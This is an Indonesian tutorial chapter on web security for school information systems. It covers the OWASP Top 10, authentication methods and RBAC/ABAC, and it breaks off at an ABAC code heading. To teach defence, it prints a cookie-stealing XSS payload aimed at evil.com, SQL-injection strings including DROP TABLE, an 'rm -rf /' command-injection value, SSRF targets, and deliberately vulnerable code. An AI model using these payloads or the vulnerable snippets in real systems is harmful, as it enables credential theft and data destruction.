# 17 — Keamanan Sistem

> **Estimasi:** 3 jam | **Level:** Menengah
> **Referensi:** [donnemartin/system-design-primer — Security](https://github.com/donnemartin/system-design-primer#security)

---

## 📖 TEORI

### Mengapa Keamanan Penting?

Untuk aplikasi sekolah, data yang harus dilindungi sangat sensitif:
- **Data siswa:** nama, alamat, NISN, data orang tua, nilai
- **Data guru:** NIP, gaji, data kepegawaian, sertifikasi
- **Data keuangan BOS:** anggaran, realisasi, pertanggungjawaban
- **Data administratif:** surat-menyurat, inventaris, dokumen resmi

**Konsekuensi kebocoran data:**
- Sanksi hukum (UU Perlindungan Data Pribadi No. 27/2022)
- Kehilangan kepercayaan dari orang tua dan masyarakat
- Kerugian finansial (denda, pemulihan sistem)
- Reputasi sekolah hancur

### Security Triangle (CIA Triad)

```
┌─────────────────────────────────────────────────────────────────┐
│                    CIA TRIAD                                    │
│                                                                 │
│                    ┌─────────────┐                              │
│                    │ CONFIDENTIAL│                              │
│                    │  (Rahasia)  │                              │
│                    └──────┬──────┘                              │
│                           │                                     │
│              ┌────────────┼────────────┐                        │
│              │            │            │                        │
│       ┌──────▼──────┐ ┌───▼───┐ ┌──────▼──────┐                │
│       │ INTEGRITY   │ │       │ │ AVAILABILITY│                │
│       │ (Keutuhan)  │ │       │ │(Ketersediaan)│                │
│       └─────────────┘ └───────┘ └─────────────┘                │
│                                                                 │
│  Confidentiality: Data hanya bisa diakses yang berhak           │
│  Integrity:       Data tidak diubah oleh pihak tidak sah        │
│  Availability:    Sistem selalu bisa diakses saat dibutuhkan    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 1. OWASP Top 10 — 10 Kerentanan Web Teratas

OWASP (Open Web Application Security Project) merilis daftar 10 kerentanan keamanan web paling kritis. Setiap developer WAJIB memahami ini.

### OWASP A01: Broken Access Control

**Apa itu:** Pengguna bisa mengakses data atau fungsi yang seharusnya tidak bisa mereka akses.

**Contoh serangan:**
```
# Scenario: Guru mencoba akses halaman admin
Normal: GET /api/admin/users        → 403 Forbidden ✅
Attack: GET /api/admin/users?id=1   → 200 OK ❌ (IDOR!)

# Scenario: Manipulasi parameter
Normal: GET /api/siswa/123/nilai    → Nilai siswa sendiri
Attack: GET /api/siswa/124/nilai    → Nilai siswa orang lain! ❌

# Scenario: HTTP Method bypass
Normal: GET  /api/laporan           → Bisa baca
Attack: DELETE /api/laporan/1       → Bisa hapus! ❌
```

**Mitigasi:**
```javascript
// ❌ SALAH — Tidak ada cek authorization
app.get('/api/siswa/:id/nilai', (req, res) => {
  const nilai = await db.nilai.find({ siswaId: req.params.id });
  res.json(nilai);
});

// ✅ BENAR — Cek authorization
app.get('/api/siswa/:id/nilai', authenticate, authorize, async (req, res) => {
  // Cek: apakah user boleh akses data siswa ini?
  if (req.user.role !== 'admin' && req.user.id !== req.params.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  const nilai = await db.nilai.find({ siswaId: req.params.id });
  res.json(nilai);
});

// Middleware pattern
function authorize(requiredRoles) {
  return (req, res, next) => {
    if (!requiredRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

// Usage:
app.delete('/api/siswa/:id', authorize(['admin']), handler);
app.get('/api/siswa/:id', authorize(['admin', 'guru']), handler);
```

### OWASP A02: Cryptographic Failures

**Apa itu:** Data sensitif tidak dienkripsi atau menggunakan enkripsi yang lemah.

**Contoh masalah:**
```
❌ Password disimpan dalam plaintext di database
❌ Password di-hash dengan MD5 atau SHA1 (sudah tidak aman)
❌ Data dikirim via HTTP (bukan HTTPS)
❌ API key hardcoded di frontend code
❌ Menggunakan algoritma enkripsi yang sudah deprecated (DES, RC4)
```

**Mitigasi:**
```javascript
// ✅ Hash password dengan bcrypt
const bcrypt = require('bcrypt');
const saltRounds = 12;

// Saat registrasi:
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
await db.users.create({ username, password: hashedPassword });

// Saat login:
const isValid = await bcrypt.compare(inputPassword, storedHash);

// ✅ Enkripsi data sensitif di database
const crypto = require('crypto');
const algorithm = 'aes-256-gcm';

function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  const tag = cipher.getAuthTag();
  return { iv: iv.toString('hex'), encrypted, tag: tag.toString('hex') };
}

// ✅ Selalu gunakan HTTPS
// Redirect HTTP ke HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(`https://${req.hostname}${req.url}`);
  }
  next();
});
```

### OWASP A03: Injection

**Apa itu:** Data tidak terpercaya dikirim sebagai bagian dari command atau query, mengubah eksekusi program.

#### SQL Injection

```sql
-- ❌ SALAH — String concatenation
query = "SELECT * FROM siswa WHERE nama = '" + userInput + "'"
-- Input: ' OR '1'='1' --
-- Hasil: SELECT * FROM siswa WHERE nama = '' OR '1'='1' --'
-- → Mengembalikan SEMUA siswa!

-- Input: '; DROP TABLE siswa; --
-- Hasil: SELECT * FROM siswa WHERE nama = ''; DROP TABLE siswa; --'
-- → Tabel siswa DIHAPUS!

-- ✅ BENAR — Parameterized query
query = "SELECT * FROM siswa WHERE nama = ?"
params = [userInput]
-- Database treat input sebagai DATA, bukan sebagai SQL code

-- ✅ BENAR — ORM (Object Relational Mapping)
const siswa = await db.siswa.findMany({
  where: { nama: userInput }
});
```

#### XSS (Cross-Site Scripting)

```html
<!-- ❌ SALAH — Render user input tanpa sanitasi -->
<div>
  Komentar: {{ userInput }}
</div>
<!-- Input: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script> -->
<!-- → Script jahat dieksekusi di browser victim! -->

<!-- ✅ BENAR — Escape/sanitize output -->
<div>
  Komentar: {{ userInput | escape }}
</div>
<!-- Output: &lt;script&gt;...&lt;/script&gt; (ditampilkan sebagai teks) -->

<!-- ✅ BENAR — Content Security Policy -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">
```

#### Command Injection

```javascript
// ❌ SALAH — User input di shell command
const { exec } = require('child_process');
exec(`ls -la ${userInput}`);
// Input: "; rm -rf /" → BAHAYA!

// ✅ BENAR — Validasi dan sanitasi
const allowedDirs = ['uploads', 'documents', 'images'];
if (!allowedDirs.includes(userInput)) {
  throw new Error('Invalid directory');
}
exec(`ls -la ${shellEscape(userInput)}`);
```

### OWASP A04: Insecure Design

**Apa itu:** Kerentanan yang muncul dari desain sistem yang buruk, bukan dari implementasi yang salah.

**Contoh insecure design:**
```
❌ Sistem tidak punya rate limiting → brute force login mudah
❌ Tidak ada audit log → tidak bisa trace siapa yang melakukan apa
❌ Password reset via security question yang mudah ditebak
❌ Fitur "forgot password" memberikan hint password
❌ Tidak ada session timeout → session selamanya aktif
```

**Secure Design Principles:**
```
┌─────────────────────────────────────────────────────────────────┐
│              SECURE DESIGN PRINCIPLES                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Defense in Depth                                            │
│     → Multiple layer security (firewall, auth, validation, etc) │
│     → Jika satu layer jebol, masih ada layer lain               │
│                                                                 │
│  2. Least Privilege                                             │
│     → Setiap user/service hanya dapat akses minimal yang butuh  │
│     → Guru tidak perlu akses ke data keuangan BOS               │
│                                                                 │
│  3. Secure by Default                                           │
│     → Default setting harus paling aman                         │
│     → Fitur baru default-nya OFF, user yang enable              │
│                                                                 │
│  4. Fail Securely                                               │
│     → Jika error, jangan leak informasi sensitif               │
│     → Return generic error message, log detail di server        │
│                                                                 │
│  5. Zero Trust                                                  │
│     → Jangan percaya siapapun, verifikasi selalu                │
│     → Internal network juga harus di-authenticate               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### OWASP A05: Security Misconfiguration

**Apa itu:** Konfigurasi keamanan yang salah atau default yang tidak diubah.

**Common misconfigurations:**
```
❌ Default password admin/admin tidak diganti
❌ Debug mode aktif di production
❌ Directory listing enabled (bisa lihat isi folder)
❌ CORS wildcard: Access-Control-Allow-Origin: *
❌ Error message menampilkan stack trace ke user
❌ Server version header: Server: Apache/2.4.49 (terlalu detail)
❌ Unused ports dan services masih terbuka
❌ SSL/TLS tidak dikonfigurasi dengan benar
```

**Mitigasi:**
```nginx
# nginx secure configuration
server {
    # Disable server version
    server_tokens off;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Disable directory listing
    autoindex off;

    # SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # Rate limiting
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req zone=api burst=20 nodelay;
}
```

### OWASP A06: Vulnerable and Outdated Components

**Apa itu:** Menggunakan library, framework, atau komponen yang memiliki vulnerability diketahui.

**Contoh:**
```
❌ Menggunakan Log4j versi lama (CVE-2021-44228 — Log4Shell)
❌ jQuery versi lama (XSS vulnerability)
❌ OpenSSL versi lama (Heartbleed vulnerability)
❌ NPM package yang sudah tidak di-maintain
```

**Mitigasi:**
```bash
# Audit dependencies secara berkala
npm audit                    # Cek vulnerability di Node.js
pip audit                    # Cek vulnerability di Python
composer audit               # Cek vulnerability di PHP

# Update dependencies
npm update                   # Update ke versi compatible
npm outdated                 # Cek package yang outdated

# Gunakan tools otomatis
npm install -g npm-audit-resolver
snyk test                    # Snyk vulnerability scanner
trivy fs .                   # Trivy filesystem scanner

# CI/CD integration
# Tambahkan security scan di pipeline
# Block deployment jika ada critical vulnerability
```

### OWASP A07: Identification and Authentication Failures

**Apa itu:** Lemahnya mekanisme autentikasi dan manajemen session.

**Common vulnerabilities:**
```
❌ Password policy lemah (min 4 karakter)
❌ Tidak ada brute force protection
❌ Session ID predictable (sequential numbers)
❌ Session tidak di-invalidate setelah logout
❌ Credential stuffing (tidak ada check breached passwords)
❌ Multi-factor authentication tidak tersedia
❌ "Remember me" token tidak expire
```

**Secure Authentication Implementation:**
```javascript
// ✅ Strong password policy
const passwordPolicy = {
  minLength: 8,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true,
  maxAttempts: 5,
  lockoutDuration: 15 * 60 * 1000, // 15 minutes
};

// ✅ Brute force protection
const loginAttempts = new Map();

async function login(username, password) {
  const attempts = loginAttempts.get(username) || { count: 0, lastAttempt: 0 };

  if (attempts.count >= passwordPolicy.maxAttempts) {
    const timeSinceLast = Date.now() - attempts.lastAttempt;
    if (timeSinceLast < passwordPolicy.lockoutDuration) {
      throw new Error('Account locked. Try again later.');
    }
    loginAttempts.delete(username); // Reset after lockout
  }

  const user = await db.users.find({ username });
  if (!user || !await bcrypt.compare(password, user.password)) {
    loginAttempts.set(username, {
      count: attempts.count + 1,
      lastAttempt: Date.now()
    });
    throw new Error('Invalid credentials');
  }

  loginAttempts.delete(username);
  return createSession(user);
}

// ✅ Secure session management
function createSession(user) {
  return {
    sessionId: crypto.randomBytes(32).toString('hex'), // 256-bit random
    userId: user.id,
    role: user.role,
    createdAt: Date.now(),
    expiresAt: Date.now() + (24 * 60 * 60 * 1000), // 24 hours
    ip: user.lastLoginIp,
    userAgent: user.lastUserAgent,
  };
}
```

### OWASP A08: Software and Data Integrity Failures

**Apa itu:** Kode dan infrastruktur tidak terlindungi dari integrity violation.

**Contoh:**
```
❌ Download update dari server tanpa verifikasi signature
❌ CI/CD pipeline tidak ada approval process
❌ Database backup tidak dienkripsi
❌ Deserialization data dari sumber tidak terpercaya
```

**Mitigasi:**
```
✅ Code signing untuk semua release
✅ Verify checksum sebelum deploy
✅ CI/CD dengan required reviews
✅ Enkripsi backup data
✅ Hindari insecure deserialization
✅ Software Bill of Materials (SBOM)
```

### OWASP A09: Security Logging and Monitoring Failures

**Apa itu:** Tidak ada logging yang memadai atau monitoring untuk mendeteksi serangan.

**What to log:**
```javascript
// ✅ Security event logging
const securityLogger = {
  logLoginSuccess: (userId, ip) => {
    logger.info({ event: 'LOGIN_SUCCESS', userId, ip, timestamp: new Date() });
  },
  logLoginFailure: (username, ip) => {
    logger.warn({ event: 'LOGIN_FAILURE', username, ip, timestamp: new Date() });
  },
  logAccessDenied: (userId, resource, action) => {
    logger.warn({ event: 'ACCESS_DENIED', userId, resource, action, timestamp: new Date() });
  },
  logDataModification: (userId, resource, action, oldValue, newValue) => {
    logger.info({ event: 'DATA_MODIFIED', userId, resource, action, timestamp: new Date() });
  },
  logRateLimitExceeded: (ip, endpoint) => {
    logger.warn({ event: 'RATE_LIMIT_EXCEEDED', ip, endpoint, timestamp: new Date() });
  },
};

// ✅ Alerting thresholds
const alerts = {
  loginFailures: { threshold: 10, window: '5m', action: 'block_ip' },
  accessDenied: { threshold: 20, window: '10m', action: 'notify_admin' },
  dataExports: { threshold: 5, window: '1h', action: 'notify_admin' },
  privilegeEscalation: { threshold: 1, window: '0m', action: 'immediate_alert' },
};
```

### OWASP A10: Server-Side Request Forgery (SSRF)

**Apa itu:** Attacker bisa membuat server mengirim request ke URL yang dikontrol attacker.

**Contoh serangan:**
```javascript
// ❌ SALAH — User input URL langsung digunakan
app.post('/api/fetch-url', authenticate, async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url); // SSRF!
  const data = await response.text();
  res.json({ data });
});

// Attacker bisa request:
// http://localhost:5774 → Akses Dapodik internal
// http://169.254.169.254/latest/meta-data/ → AWS metadata
// http://internal-db:3306 → Akses database internal

// ✅ BENAR — Validasi dan whitelist URL
const ALLOWED_DOMAINS = ['example.com', 'cdn.example.com'];

app.post('/api/fetch-url', authenticate, async (req, res) => {
  const { url } = req.body;
  const parsed = new URL(url);

  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
    return res.status(400).json({ error: 'Domain not allowed' });
  }

  // Block internal IPs
  const ip = dns.lookupSync(parsed.hostname);
  if (isInternalIP(ip)) {
    return res.status(400).json({ error: 'Internal access not allowed' });
  }

  const response = await fetch(url);
  res.json({ data: await response.text() });
});

function isInternalIP(ip) {
  return ip.startsWith('10.') ||
         ip.startsWith('192.168.') ||
         ip.startsWith('172.') ||
         ip.startsWith('127.') ||
         ip.startsWith('169.254.');
}
```

### OWASP Top 10 Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    OWASP TOP 10 SUMMARY                         │
├──────┬──────────────────────────────────┬───────────────────────┤
│ ID   │ Vulnerability                    │ Risk Level            │
├──────┼──────────────────────────────────┼───────────────────────┤
│ A01  │ Broken Access Control            │ CRITICAL              │
│ A02  │ Cryptographic Failures           │ HIGH                  │
│ A03  │ Injection                        │ CRITICAL              │
│ A04  │ Insecure Design                  │ HIGH                  │
│ A05  │ Security Misconfiguration        │ HIGH                  │
│ A06  │ Vulnerable & Outdated Components │ MEDIUM-HIGH           │
│ A07  │ Identification & Auth Failures   │ CRITICAL              │
│ A08  │ Software & Data Integrity        │ HIGH                  │
│ A09  │ Logging & Monitoring Failures    │ MEDIUM-HIGH           │
│ A10  │ Server-Side Request Forgery      │ HIGH                  │
└──────┴──────────────────────────────────┴───────────────────────┘
```

---

## 2. Authentication — Siapa Kamu?

### Session-Based Authentication

Metode tradisional: server menyimpan session di memory/database.

```
┌─────────────────────────────────────────────────────────────────┐
│              SESSION-BASED AUTH FLOW                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Login:                                                      │
│     Client ──[POST /login {user, pass}]──▶ Server               │
│     Server: verifikasi credentials                              │
│     Server: buat session ID, simpan di server storage           │
│     Server ◀──[Set-Cookie: session_id=abc123]── Client          │
│                                                                 │
│  2. Subsequent requests:                                        │
│     Client ──[Cookie: session_id=abc123]──▶ Server              │
│     Server: lookup session di storage                           │
│     Server: jika valid, process request                         │
│     Server ◀──[Response]── Client                               │
│                                                                 │
│  3. Logout:                                                     │
│     Client ──[POST /logout]──▶ Server                           │
│     Server: hapus session dari storage                          │
│     Server ◀──[Set-Cookie: session_id=; expires=0]── Client     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Kelebihan:**
- Server bisa invalidate session kapan saja (force logout)
- Session data tersimpan di server (bisa simpan info tambahan)
- Cocok untuk aplikasi web tradisional

**Kekurangan:**
- Server harus simpan state (tidak scalable horizontal tanpa shared session store)
- Butuh session storage (Redis, database)
- CSRF protection diperlukan

**Implementasi:**
```javascript
// Express.js dengan express-session + Redis store
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const Redis = require('ioredis');

const redisClient = new Redis();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Random 256-bit string
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,        // HTTPS only
    httpOnly: true,      // Tidak bisa diakses JavaScript
    sameSite: 'strict',  // CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  }
}));
```

### JWT (JSON Web Token) Authentication

Token-based authentication: server membuat token yang ditandatangani, client menyimpan dan mengirim di setiap request.

```
┌─────────────────────────────────────────────────────────────────┐
│                    JWT STRUCTURE                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JWT = Header.Payload.Signature                                 │
│                                                                 │
│  Header (Base64Url encoded):                                    │
│  {                                                              │
│    "alg": "HS256",     // Algorithm                             │
│    "typ": "JWT"        // Type                                  │
│  }                                                              │
│                                                                 │
│  Payload (Base64Url encoded):                                   │
│  {                                                              │
│    "sub": "123",        // Subject (user ID)                    │
│    "name": "Budi",      // Custom claim                         │
│    "role": "guru",      // Custom claim                         │
│    "iat": 1712345678,   // Issued at                            │
│    "exp": 1712432078    // Expiration (1 hour)                  │
│  }                                                              │
│                                                                 │
│  Signature:                                                     │
│  HMACSHA256(                                                    │
│    base64UrlEncode(header) + "." +                              │
│    base64UrlEncode(payload),                                    │
│    SECRET_KEY                                                   │
│  )                                                              │
│                                                                 │
│  Result: eyJhbGciOiJIUzI1NiIs... (3 bagian dipisah titik)       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**JWT Auth Flow:**
```
┌─────────────────────────────────────────────────────────────────┐
│                    JWT AUTH FLOW                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. Login:                                                      │
│     Client ──[POST /login {user, pass}]──▶ Server               │
│     Server: verifikasi credentials                              │
│     Server: buat JWT token (sign dengan secret key)             │
│     Server ◀──[{ token: "eyJhbGci..." }]── Client               │
│                                                                 │
│  2. Subsequent requests:                                        │
│     Client ──[Authorization: Bearer eyJhbGci...]──▶ Server      │
│     Server: verify signature (tanpa lookup database!)           │
│     Server: jika valid, process request                         │
│     Server ◀──[Response]── Client                               │
│                                                                 │
│  3. Token expired:                                              │
│     Server ◀──[401 Unauthorized]── Client                       │
│     Client: refresh token atau login ulang                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Kelebihan:**
- Stateless — server tidak perlu simpan session
- Scalable — mudah horizontal scaling
- Cocok untuk microservices dan mobile apps

**Kekurangan:**
- Tidak bisa invalidate token sebelum expired (kecuali pakai blacklist)
- Token size lebih besar dari session ID
- Jika secret key bocor, semua token bisa di-forgery

**Implementasi:**
```javascript
const jwt = require('jsonwebtoken');

// Create token
function createToken(user) {
  return jwt.sign(
    {
      sub: user.id,
      role: user.role,
      name: user.name,
    },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
}

// Verify token middleware
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(403).json({ error: 'Invalid token' });
  }
}

// Refresh token pattern (Access + Refresh tokens)
function createTokens(user) {
  return {
    accessToken: jwt.sign({ sub: user.id, role: user.role },
      process.env.JWT_ACCESS_SECRET, { expiresIn: '15m' }),
    refreshToken: jwt.sign({ sub: user.id },
      process.env.JWT_REFRESH_SECRET, { expiresIn: '7d' }),
  };
}
```

### OAuth 2.0 — Delegated Authorization

OAuth 2.0 memungkinkan user memberikan akses ke aplikasi lain tanpa memberikan password.

```
┌─────────────────────────────────────────────────────────────────┐
│              OAUTH 2.0 AUTHORIZATION CODE FLOW                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Actor:                                                         │
│  - Resource Owner    = User (siswa/guru)                        │
│  - Client            = Aplikasi sekolah                         │
│  - Authorization     = Google/Microsoft (provider)              │
│    Server                                                       │
│  - Resource Server   = Google API (data yang diakses)           │
│                                                                 │
│  Flow:                                                          │
│                                                                 │
│  1. Client redirect user ke Authorization Server:               │
│     https://accounts.google.com/o/oauth2/auth?                  │
│       client_id=XXX&                                            │
│       redirect_uri=https://sekolah.app/callback&                │
│       response_type=code&                                       │
│       scope=email profile                                       │
│                                                                 │
│  2. User login dan approve di Google                            │
│                                                                 │
│  3. Google redirect kembali ke Client dengan authorization code:│
│     https://sekolah.app/callback?code=AUTH_CODE                 │
│                                                                 │
│  4. Client tukar code dengan access token (server-to-server):   │
│     POST https://oauth2.googleapis.com/token                    │
│     {                                                           │
│       code: "AUTH_CODE",                                        │
│       client_id: "XXX",                                         │
│       client_secret: "SECRET",                                  │
│       redirect_uri: "https://sekolah.app/callback",             │
│       grant_type: "authorization_code"                          │
│     }                                                           │
│                                                                 │
│  5. Google response dengan access token:                        │
│     {                                                           │
│       access_token: "ya29.xxx",                                 │
│       token_type: "Bearer",                                     │
│       expires_in: 3600,                                         │
│       refresh_token: "1//xxx"                                   │
│     }                                                           │
│                                                                 │
│  6. Client pakai access token untuk akses resource:             │
│     GET https://www.googleapis.com/userinfo/v2/me               │
│     Authorization: Bearer ya29.xxx                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**OAuth 2.0 Grant Types:**

```
┌─────────────────────────────────────────────────────────────────┐
│              OAUTH 2.0 GRANT TYPES                              │
├──────────────────────┬──────────────────────────────────────────┤
│ Grant Type           │ Use Case                                 │
├──────────────────────┼──────────────────────────────────────────┤
│ Authorization Code   │ Web apps (paling aman)                   │
│ + PKCE               │ Mobile/SPA apps                          │
│ Implicit             │ ❌ DEPRECATED — jangan pakai lagi        │
│ Client Credentials   │ Machine-to-machine (tanpa user)          │
│ Device Code          │ IoT devices, smart TV                    │
│ Refresh Token        │ Mendapatkan access token baru            │
└──────────────────────┴──────────────────────────────────────────┘
```

### OpenID Connect (OIDC)

OIDC adalah **authentication layer** di atas OAuth 2.0. OAuth 2.0 untuk authorization, OIDC menambahkan authentication.

```
OAuth 2.0:  "Aplikasi boleh akses email dan profil user"
OIDC:       "User ini adalah ahmad@gmail.com, dan dia sudah login"

OIDC menambahkan:
- ID Token (JWT) berisi informasi user
- Standardized userinfo endpoint
- Standardized scopes: openid, profile, email, phone, address

ID Token example:
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",
  "aud": "client_id_sekolah_app",
  "exp": 1712345678,
  "iat": 1712342078,
  "email": "ahmad@gmail.com",
  "email_verified": true,
  "name": "Ahmad Fauzi",
  "picture": "https://..."
}
```

### SAML (Security Assertion Markup Language)

SAML adalah standar XML-based untuk SSO (Single Sign-On), umum di enterprise dan institusi pendidikan.

```
┌─────────────────────────────────────────────────────────────────┐
│                    SAML SSO FLOW                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. User akses aplikasi sekolah                                 │
│  2. Aplikasi redirect ke Identity Provider (IdP)                │
│  3. User login di IdP (SSO portal sekolah)                      │
│  4. IdP buat SAML Assertion (XML) berisi:                       │
│     - Siapa user (Subject)                                      │
│     - Atribut user (role, departemen, dll)                      │
│     - Kondisi (waktu valid, audience)                           │
│  5. IdP kirim SAML Assertion ke aplikasi (via browser POST)     │
│  6. Aplikasi verifikasi signature dan buat session              │
│  7. User sudah login!                                           │
│                                                                 │
│  SAML Assertion (simplified):                                   │
│  <saml:Assertion>                                               │
│    <saml:Subject>ahmad@sekolah.sch.id</saml:Subject>            │
│    <saml:Attribute Name="role">                                 │
│      <saml:AttributeValue>guru</saml:AttributeValue>            │
│    </saml:Attribute>                                            │
│    <saml:Attribute Name="nip">                                  │
│      <saml:AttributeValue>198501012010011001</saml:AttributeValue>│
│    </saml:Attribute>                                            │
│  </saml:Assertion>                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Authentication Methods Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│              AUTHENTICATION COMPARISON                          │
├──────────────────────┬──────────┬──────┬────────┬───────────────┤
│ Fitur                │ Session  │ JWT  │ OAuth  │ SAML          │
├──────────────────────┼──────────┼──────┼────────┼───────────────┤
│ State                │ Stateful │ State│ State  │ Stateful      │
│                      │ (server) │ less │ less   │ (IdP)         │
├──────────────────────┼──────────┼──────┼────────┼───────────────┤
│ Scalability          │ Butuh    │ Mudah│ Mudah  │ Butuh IdP     │
│                      │ shared   │      │        │               │
│                      │ store    │      │        │               │
├──────────────────────┼──────────┼──────┼────────┼───────────────┤
│ Revocation           │ Mudah    │ Sulit│ Mudah  │ Mudah         │
│                      │ (hapus   │ (butuh│ (revoke│ (IdP logout) │
│                      │ session) │ black│ token) │               │
│                      │          │ list)│        │               │
├──────────────────────┼──────────┼──────┼────────┼───────────────┤
│ Use case             │ Web apps │ API, │ Social │ Enterprise    │
│                      │ tradisio │ mobile│ login │ SSO           │
│                      │ nal      │      │        │               │
├──────────────────────┼──────────┼──────┼────────┼───────────────┤
│ Complexity           │ Rendah   │ Rendah│ Medium│ Tinggi        │
├──────────────────────┼──────────┼──────┼────────┼───────────────┤
│ Browser support      │ Native   │ Perlu│ Perlu  │ Perlu         │
│                      │          │ JS   │ redirect│ redirect     │
└──────────────────────┴──────────┴──────┴────────┴───────────────┘
```

---

## 3. Authorization — Apa Yang Boleh Kamu Lakukan?

### RBAC (Role-Based Access Control)

Akses diberikan berdasarkan **role** user.

```
┌─────────────────────────────────────────────────────────────────┐
│                    RBAC MODEL                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Users ──▶ Roles ──▶ Permissions ──▶ Resources                  │
│                                                                 │
│  Contoh di sekolah:                                             │
│                                                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────────────┐   │
│  │ Admin    │───▶│ Admin    │───▶│ CRUD semua data          │   │
│  │          │    │ Role     │    │ Manage users & roles     │   │
│  │          │    │          │    │ Access financial reports │   │
│  │          │    │          │    │ System configuration     │   │
│  └──────────┘    └──────────┘    └──────────────────────────┘   │
│                                                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────────────┐   │
│  │ Guru     │───▶│ Guru     │───▶│ Input absensi & nilai    │   │
│  │          │    │ Role     │    │ Lihat data siswa         │   │
│  │          │    │          │    │ Edit data diri           │   │
│  └──────────┘    └──────────┘    └──────────────────────────┘   │
│                                                                 │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────────────┐   │
│  │ Orang Tua│───▶│ Parent   │───▶│ Lihat nilai anak         │   │
│  │          │    │ Role     │    │ Lihat absensi anak       │   │
│  │          │    │          │    │ Update kontak            │   │
│  └──────────┘    └──────────┘    └──────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Implementasi RBAC:**
```javascript
// Role-Permission mapping
const permissions = {
  admin: [
    'user:create', 'user:read', 'user:update', 'user:delete',
    'siswa:create', 'siswa:read', 'siswa:update', 'siswa:delete',
    'guru:create', 'guru:read', 'guru:update', 'guru:delete',
    'keuangan:read', 'keuangan:create', 'keuangan:delete',
    'settings:update',
  ],
  guru: [
    'siswa:read',
    'absensi:create', 'absensi:read', 'absensi:update',
    'nilai:create', 'nilai:read', 'nilai:update',
    'user:read:self', 'user:update:self',
  ],
  orang_tua: [
    'siswa:read:own_child',
    'absensi:read:own_child',
    'nilai:read:own_child',
    'user:read:self', 'user:update:self',
  ],
};

// Authorization middleware
function authorize(permission) {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPerms = permissions[userRole] || [];

    if (!userPerms.includes(permission)) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        required: permission,
        role: userRole,
      });
    }
    next();
  };
}

// Usage
app.post('/api/absensi',
  authenticate,
  authorize('absensi:create'),
  createAbsensiHandler
);

app.delete('/api/siswa/:id',
  authenticate,
  authorize('siswa:delete'),
  deleteSiswaHandler
);
```

### ABAC (Attribute-Based Access Control)

Akses diberikan berdasarkan **atribut** user, resource, environment, dan action.

```
┌─────────────────────────────────────────────────────────────────┐
│                    ABAC MODEL                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Policy = Subject attributes + Resource attributes +            │
│           Environment attributes + Action                       │
│                                                                 │
│  Contoh policies:                                               │
│                                                                 │
│  1. "Guru boleh input nilai JIKA:                               │
│      - role = 'guru'                                            │
│      - DAN guru mengajar kelas siswa tersebut                   │
│      - DAN semester sedang aktif                                │
│      - DAN jam kerja (07:00-16:00)"                             │
│                                                                 │
│  2. "Orang tua boleh lihat nilai JIKA:                          │
│      - role = 'orang_tua'                                       │
│      - DAN siswa adalah anak dari orang tua tersebut            │
│      - DAN tidak ada pembatasan akses dari sekolah"             │
│                                                                 │
│  3. "Admin boleh hapus data JIKA:                               │
│      - role = 'admin'                                           │
│      - DAN ada approval dari kepala sekolah                     │
│      - DAN data sudah di-backup"                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Implementasi ABAC:**
```javascript
// ABAC Policy Engine
